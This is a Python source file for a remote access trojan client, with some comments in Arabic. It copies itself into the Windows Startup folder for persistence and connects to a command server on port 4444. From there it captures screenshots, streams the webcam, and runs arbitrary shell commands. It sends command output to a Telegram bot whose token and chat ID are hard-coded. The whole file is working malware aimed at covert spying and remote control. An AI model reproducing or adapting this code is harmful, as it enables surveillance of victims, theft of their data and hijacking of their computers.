import socket
from PIL import ImageGrab, Image
from io import BytesIO
import cv2
import numpy as np
import subprocess
import requests
import os
import sys
import shutil
path_app = os.path.abspath(sys.argv[0])
run_start = os.path.join(os.getenv("APPDATA"), "Microsoft" , "Windows" , "Start Menu" , "Programs", "Startup")
name = os.path.join(run_start , "client.exe") 

if not os.path.exists(name):
    shutil.copy(path_app , name)


host = "192.168.1.x"
port = 4444

token = "8335655513:AAHsU4r6lEMI893okdglC-qHgXzH-bKhBig"
chat_id = "6038063195"

def client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    print(f"Connected to server {host}:{port}")
    
    try:
        while True:
            command = client.recv(1024).decode()
            print(f"Received command: {command}")
            
            if command.lower() == "screenshot":
                screen = ImageGrab.grab()
                with BytesIO() as output:
                    screen.save(output, format="PNG")
                    data = output.getvalue()
                
                size = len(data)
                client.sendall(size.to_bytes(4, 'big'))
                client.sendall(data)
                print(f"Screenshot sent! ({size} bytes)")
                
            elif command.lower() == "live":
                cap = cv2.VideoCapture(0)
                print("Starting live video...")
                
                while True:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img = Image.fromarray(frame_rgb)
                    with BytesIO() as output:
                        img.save(output, format="JPEG", quality=70)
                        data = output.getvalue()
                    
                    size = len(data)
                    client.sendall(size.to_bytes(4, 'big'))
                    client.sendall(data)
                    
                    client.settimeout(0.001)
                    try:
                        stop = client.recv(1024).decode()
                        if stop == "stop":
                            break
                    except:
                        pass
                    client.settimeout(None)
                
                cap.release()
                print("Live video stopped")
                
            elif command.lower() == "cmd":
                current_dir = os.getcwd() 
                while True:
                    comm = client.recv(1024).decode().strip()
                    
                    # للخروج من وضع CMD
                    if comm.lower() == "exitcmd":
                        break
                    
                    # معالجة أمر cd
                    if comm.lower().startswith("cd "):
                        try:
                            new_path = comm[3:].strip()
                            if new_path == "..":
                                current_dir = os.path.dirname(current_dir)
                            else:
                                test_path = os.path.join(current_dir, new_path) if not os.path.isabs(new_path) else new_path
                                if os.path.isdir(test_path):
                                    current_dir = os.path.abspath(test_path)
                                    output = f"✅ Changed to: {current_dir}"
                                else:
                                    output = f"❌ Not found: {test_path}"
                        except Exception as e:
                            output = f"❌ Error: {str(e)}"
                    else:
                        # تنفيذ الأمر
                        result = subprocess.run(
                            comm,
                            shell=True,
                            capture_output=True,
                            text=True,
                            cwd=current_dir
                        )
                        
                        output = result.stdout + result.stderr
                        if not output.strip():
                            output = "✅ Command executed (no output)"
                    
                    # إرسال للتليجرام
                    url = f"https://api.telegram.org/bot{token}/sendMessage"
                    message = f"📂 {current_dir}\n\n{output}"
                    params = {
                        "chat_id": chat_id,
                        "text": message[:4000]  # حد أقصى 4000 حرف
                    }
                    requests.post(url, params)
                
            elif command.lower() == "exit":
                print("Exiting...")
                break
            else:
                print(f"Unknown command: {command}")
                
    finally:
        client.close()

if __name__ == "__main__":
    client()
